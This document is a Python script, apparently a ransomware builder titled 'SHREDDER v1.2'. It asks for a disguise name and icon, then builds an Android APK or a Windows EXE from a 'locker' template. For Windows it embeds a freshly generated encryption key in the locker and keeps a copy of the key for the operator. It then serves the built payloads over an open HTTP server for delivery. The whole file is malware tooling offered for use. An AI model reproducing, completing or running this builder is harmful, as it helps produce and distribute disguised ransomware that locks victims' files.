#!/usr/bin/env python3
import os
import time
import shutil
import subprocess
from http.server import SimpleHTTPRequestHandler, HTTPServer
from cryptography.fernet import Fernet
from colorama import Fore, Style, init

init(autoreset=True)

banner = f"""{Fore.RED}
┌────────────────────────────────────────────────────────────────────────────┐
│                                                                            │
│                               █████████████                               │
│                               ▅   ▄▆▋                                      │
│                               ██▇▇██▋                                      │
│                               ██▆▅██▋                                      │
│                               ██▇▅██▋                                      │
│                               ██████▋                                      │
│                               ██▃▁██▋                                      │
│                               ██▄▂██▋                                      │
│                               ██▇▆██▋                                      │
│                               ██▄▂██▋                                      │
│                               ██▃▁██▋                                      │
│                               ██▇▆██▋                                      │
│                               ██▄▂██▋                                      │
│                               ██▃▁██▋                                      │
│                               ██████▋                                      │
│                               █▇▇▇██▋                                      │
│                            ▊▉▉▇▊▊▉▉▄▃▉▉▍                                  │
│                            ▃▄▄▇▅▄▄▄▇▅▄▄▋                                  │
│                               ▁▂▊▊▉▅▎                                     │
│                               ▍▂   ▄▎                                     │
│                               ▍▂   ▄▎                                     │
│                               ▍▂   ▄▎                                     │
│                               ▍▂   ▄▎                                     │
│                               ▍▂   ▄▎                                     │
│                               ▍▂   ▄▎                                     │
│                               ▍▂   ▄▎                                     │
│                               ▍▂   ▄▎                                     │
│                               ▏▊▊▊▊▊▏                                     │
│                                                                            │
│                          SHREDDER  v1.2  by TR4N5P4R3NT                    │
└────────────────────────────────────────────────────────────────────────────┘
{Style.RESET_ALL}
"""

def menu():
    print(f"{Fore.CYAN}Select target platform:\n")
    print(f"{Fore.GREEN}[1]{Style.RESET_ALL} Android APK")
    print(f"{Fore.GREEN}[2]{Style.RESET_ALL} Windows EXE\n")
    choice = input(f"{Fore.YELLOW}Choice (1 or 2): {Style.RESET_ALL}")
    while choice not in ['1', '2']:
        choice = input(f"{Fore.RED}Invalid. Please enter 1 or 2: {Style.RESET_ALL}")
    return "android" if choice == "1" else "windows"

def get_inputs():
    name = input(f"{Fore.CYAN}Enter App Name: {Style.RESET_ALL}")
    
    # icon path validation loop
    while True:
        icon = input(f"{Fore.CYAN}Enter Path to Icon File (.png or .ico): {Style.RESET_ALL}")
        if os.path.isfile(icon):
            break
        print(f"{Fore.RED}Icon not found at '{icon}'. Please try again.{Style.RESET_ALL}")
    
    output = os.path.join("output", name.replace(" ", "_"))
    os.makedirs(output, exist_ok=True)
    return name, icon, output

def summary(app_type, name, icon, output):
    print(f"\n{Fore.MAGENTA}--- Summary ---")
    print(f"{Fore.BLUE}Target Type: {app_type.capitalize()}")
    print(f"{Fore.BLUE}App Name:    {name}")
    print(f"{Fore.BLUE}Icon Path:   {icon}")
    print(f"{Fore.BLUE}Output Dir:  {output}\n")

    confirm = input(f"{Fore.YELLOW}Continue? (Y/n): {Style.RESET_ALL}")
    if confirm.lower() in ["n", "no"]:
        print(f"{Fore.RED}Cancelled.")
        exit()
    print(f"{Fore.GREEN}✔ Starting build...\n")
    time.sleep(1)

def prepare_android(name, icon, output):
    tpl = "builder/templates/android_template"
    dest = os.path.join(output, "android_build")
    shutil.copytree(tpl, dest)
    # copy your icon
    shutil.copy(icon, os.path.join(dest, "icon.png"))
    # customize buildozer.spec
    spec = os.path.join(dest, "buildozer.spec")
    with open(spec, "r") as f: data = f.read()
    data = data.replace("title = SHREDDER", f"title = {name}")
    with open(spec, "w") as f: f.write(data)
    # build
    print(f"{Fore.CYAN}→ Building APK with Buildozer...")
    subprocess.call(["buildozer", "android", "debug"], cwd=dest)
    apk_src = os.path.join(dest, "bin", "shredder-0.1-debug.apk")
    apk_dst = os.path.join(output, f"{name}.apk")
    shutil.move(apk_src, apk_dst)
    print(f"{Fore.GREEN}✔ APK generated: {apk_dst}")

def prepare_windows(name, icon, output):
    tpl = "builder/templates/windows_template"
    dest = os.path.join(output, "windows_build")
    shutil.copytree(tpl, dest)
    # generate key & embed
    key = Fernet.generate_key()
    pyfile = os.path.join(dest, "locker.py")
    with open(pyfile, "r") as f: data = f.read()
    data = data.replace("YOUR_REPLACEABLE_KEY", key.decode())
    with open(pyfile, "w") as f: f.write(data)
    # build EXE
    print(f"{Fore.CYAN}→ Building EXE with PyInstaller...")
    subprocess.call([
        "pyinstaller", "--onefile",
        "--name", name,
        "--icon", icon,
        "locker.py"
    ], cwd=dest)
    exe_src = os.path.join(dest, "dist", f"{name}.exe")
    exe_dst = os.path.join(output, f"{name}.exe")
    shutil.move(exe_src, exe_dst)
    # save key
    with open(os.path.join(output, "encryption_key.txt"), "wb") as f:
        f.write(key)
    print(f"{Fore.GREEN}✔ EXE generated: {exe_dst}")
    print(f"{Fore.GREEN}✔ Key saved: {os.path.join(output, 'encryption_key.txt')}")

def host_payload(output):
    os.chdir(output)
    port = 8000
    print(f"\n{Fore.CYAN}Hosting payloads at http://0.0.0.0:{port}/\n")
    HTTPServer(("0.0.0.0", port), SimpleHTTPRequestHandler).serve_forever()

if __name__ == "__main__":
    os.system("clear")
    print(banner)
    app_type = menu()
    name, icon, output = get_inputs()
    summary(app_type, name, icon, output)

    if app_type == "android":
        prepare_android(name, icon, output)
    else:
        prepare_windows(name, icon, output)

    host_payload(output)
